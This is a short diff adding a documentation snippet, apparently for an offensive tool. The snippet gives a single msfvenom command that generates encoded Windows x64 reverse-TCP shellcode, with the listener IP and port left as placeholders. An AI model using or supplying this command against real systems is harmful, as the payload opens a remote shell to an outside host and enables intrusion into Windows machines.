@@ -1,0 +1,3 @@
+Shellcode can be created via the following command:
+
+msfvenom -p windows/x64/shell_reverse_tcp lhost=<ip> lport=<port> -f raw -e <encoding> -o shellcode.bin
